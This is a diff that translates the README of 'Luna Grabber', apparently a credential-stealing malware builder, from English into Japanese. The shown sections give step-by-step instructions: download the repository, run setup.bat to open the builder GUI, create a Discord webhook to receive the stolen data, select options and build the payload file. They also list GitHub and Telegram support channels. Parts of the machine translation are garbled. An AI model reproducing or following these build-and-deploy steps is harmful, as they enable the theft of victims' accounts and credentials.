@@ -79,24 +79,24 @@
  
 <hr  style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;"  noshade=""  size="20"  width="100%">
   
-## Installation
+## インストール
 
 ### 1. [Download](https://www.python.org/downloads/) Python:
 
 ```
 Python 3.11+がインストールされ、パスに追加されていることを確認してください。
 ```
-### 2. [Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip) The Files:
+### 2. [Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip) ファイル:
 
 ```
 ファイルをダウンロードしたら、フォルダを解凍して .zip ファイルでなくしてください。
 ```
-### 3. Open The setup.bat File:
+### 3. setup.batファイルを開く:
 
 ```
 手動でモジュールをインストールする必要はありません。setup.batを開くだけでインストールされます。成功すれば、setup.batがguiを開きます。
 ```
-### 4. Create A Webhook:
+### 4. Webhookを作る:
 
 ```
 ウェブフックの作り方がわからない場合は、こちらのガイドに従ってください： https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
@@ -108,11 +108,11 @@ Webhookを作成したら、Webhookプロンプトに貼り付けます。
 これで、有効にしたいオプションにチェックを入れることができます。
 各オプションが説明されているドキュメントを参照してください。
 ```
-### 6. Build The File
+### 6.ファイルを構築する
 ```
 最後にファイルを作成するには、ファイル名を入力してビルドを押してください。ビルドが完了すると、ビルドボタンに「Built File」と表示されます。
 ```
-### 7. What Now?
+### 7.今度は何だ？?
 
 ```
 ビルドしたファイルは、現在のフォルダに設定した名前で表示されます。
@@ -132,26 +132,26 @@ Webhookを作成したら、Webhookプロンプトに貼り付けます。
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom: 20px;" width="70%" src="https://i.imgur.com/s5f4HVs.png"></img>
 </div>
 
-## Contributing
-Contributions are a great way to keep the project active and up to date. Any contributions you make are **greatly appreciated**.
+## 貢献する
+プロジェクトへの貢献は、プロジェクトを活発で最新の状態に保つための素晴らしい方法です。どんな貢献でも大歓迎です**。
 
-If you have a suggestion that would make this project better, you can simply open a [feature request](https://github.com/Smug246/Luna-Grabber/issues/new?assignees=Smug246&labels=enhancement&projects=&template=feature_request.yml&title=feature%3A).
-Don't forget to give the project a star! Thanks again!
+このプロジェクトをより良くするための提案があれば、[feature request](https://github.com/Smug246/Luna-Grabber/issues/new?assignees=Smug246&labels=enhancement&projects=&template=feature_request.yml&title=feature%3A) を開いてください。
+プロジェクトに星をつけることを忘れないでください！ありがとうございました！
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/NewFeature`)
-3. Commit your Changes (`git commit -m 'Add New Feature'`)
-4. Push to the Branch (`git push origin feature/NewFeature`)
-5. Open a Pull Request
+1. プロジェクトをフォークする
+2. 機能ブランチを作成します (`git checkout -b feature/NewFeature`)
+3. 変更をコミットする (`git commit -m 'Add New Feature'`)
+4. ブランチにプッシュします (`git push origin feature/NewFeature`)
+5. プルリクエストをオープンする
 
-## Errors
-If you find an error that you cant fix and need help with you can submit an [issue](https://github.com/Smug246/Luna-Grabber/issues/) or join the [telegram](https://t.me/lunaxsmug) for support
-
-
-## License
-Luna Grabber is distributed under the MIT License. See `LICENSE.md` for more information.
+## エラー
+もし修正できないエラーを見つけ、サポートが必要な場合は、[issue](https://github.com/Smug246/Luna-Grabber/issues/)を送信するか、[telegram](https://t.me/lunaxsmug)に参加してください。
 
 
-## Star Graph
+## ライセンス
+Luna Grabber は MIT License の下で配布されています。詳細は `LICENSE.md` を参照してください。
 
-![Star History Chart](https://api.star-history.com/svg?repos=Smug246/Luna-Grabber&type=Date)
+
+## 星のグラフ
+
+星の歴史グラフ](https://api.star-history.com/svg?repos=Smug246/Luna-Grabber&type=Date)
